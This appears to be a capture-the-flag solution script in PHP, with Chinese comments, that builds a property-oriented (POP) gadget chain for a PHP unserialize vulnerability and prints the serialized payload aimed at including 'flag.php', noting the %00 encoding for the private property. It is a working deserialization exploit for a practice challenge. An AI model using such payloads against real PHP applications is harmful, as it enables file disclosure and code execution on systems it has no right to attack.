// php反序列化漏洞，构造pop链即可
// 需要注意的一点就是Modifier的$var是private，提交时将空格替代为%00即可

<?php
class Modifier{
    private $var = 'flag.php';
}
class show{
    public $source;
    public $str;
}

class Test{
    public $p;
}

$mod = new Modifier();
$test = new Test();
$test->p=$mod;
$show=new show();
$show->source=$show;
$show->str=$test;

echo serialize($show);
//O:4:"show":2:{s:6:"source";r:1;s:3:"str";O:4:"Test":1:{s:1:"p";O:8:"Modifier":1:{s:13:"%00Modifier%00var";s:8:"flag.php";}}}
?>
